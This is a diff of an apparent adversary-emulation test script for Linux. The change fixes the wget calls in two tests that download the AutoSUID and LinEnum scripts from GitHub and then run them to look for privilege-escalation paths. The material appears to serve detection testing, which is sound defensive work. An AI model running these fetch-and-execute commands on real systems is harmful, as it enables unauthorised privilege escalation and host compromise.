@@ -37,7 +37,7 @@ function d() {
 # Atomic Test 3 - Harvest SUID executable files
 # AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges.
     echo $(date -u) "Start of T1059.004 - Harvest SUID executable files" >> /tmp/attacktest.txt
-    wget -O https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/autosuid.sh
+    wget https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/autosuid.sh
     chmod +x autosuid.sh
     bash autosuid.sh
     echo $(date -u) "Completed T1059.004 - Harvest SUID executable files" >> /tmp/attacktest.txt
@@ -48,7 +48,7 @@ function e() {
 # Atomic Test 4 - LinEnum tool execution
 # LinEnum is a bash script that performs discovery commands for accounts,processes, kernel version, applications, services, and uses the information from these commands to present operator with ways of escalating privileges or further exploitation of targeted host.
     echo $(date -u) "Start of T1059.004 - LinEnum tool execution" >> /tmp/attacktest.txt
-    wget -O https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/linenum.sh
+    wget https://raw.githubusercontent.com/blueteamdefendersco/redatomics/main/atomic_scripts/linux/execution/payloads1/linenum.sh
     chmod +x linenum.sh
     bash linenum.sh
     echo $(date -u) "Completed T1059.004 - LinEnum tool execution" >> /tmp/attacktest.txt
